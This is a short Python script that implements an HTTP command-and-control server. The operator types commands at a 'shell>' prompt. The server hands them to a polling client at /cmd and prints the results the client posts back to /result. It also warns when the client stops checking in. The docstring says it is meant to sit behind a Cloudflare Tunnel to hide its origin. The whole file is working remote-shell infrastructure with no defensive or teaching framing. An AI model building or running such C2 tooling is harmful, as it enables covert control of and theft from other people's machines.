#!/usr/bin/env python3
"""
HTTP-based C2 server. Runs on Mac behind Cloudflare Tunnel.
Usage: python3 server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
import sys
import time

pending_command = None
lock = threading.Lock()
last_checkin = 0


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle each request in a new thread for responsiveness."""
    daemon_threads = True


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    def do_GET(self):
        global pending_command, last_checkin
        if self.path == "/cmd":
            last_checkin = time.time()
            with lock:
                cmd = pending_command or ""
                pending_command = None
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(cmd.encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path == "/result":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="replace")
            sys.stdout.write("\r\033[K" + body)
            sys.stdout.write("shell> ")
            sys.stdout.flush()
            self.send_response(200)
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()


def input_loop():
    global pending_command
    while True:
        try:
            cmd = input("shell> ")
            if not cmd.strip():
                continue
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            sys.exit(0)
        with lock:
            pending_command = cmd


def status_printer():
    """Prints a status line if client hasn't checked in recently."""
    global last_checkin
    shown_waiting = False
    while True:
        time.sleep(5)
        if last_checkin == 0 and not shown_waiting:
            pass  # still waiting for first connect
        elif last_checkin > 0:
            elapsed = time.time() - last_checkin
            if elapsed > 15 and not shown_waiting:
                sys.stdout.write("\r\033[K[!] No check-in for {:.0f}s — client may be offline\nshell> ".format(elapsed))
                sys.stdout.flush()
                shown_waiting = True
            elif elapsed <= 15:
                shown_waiting = False


if __name__ == "__main__":
    PORT = 4444
    server = ThreadedHTTPServer(("127.0.0.1", PORT), Handler)
    print(f"[*] Listening on http://127.0.0.1:{PORT}")
    print("[*] Waiting for client to connect...\n")

    threading.Thread(target=input_loop, daemon=True).start()
    threading.Thread(target=status_printer, daemon=True).start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
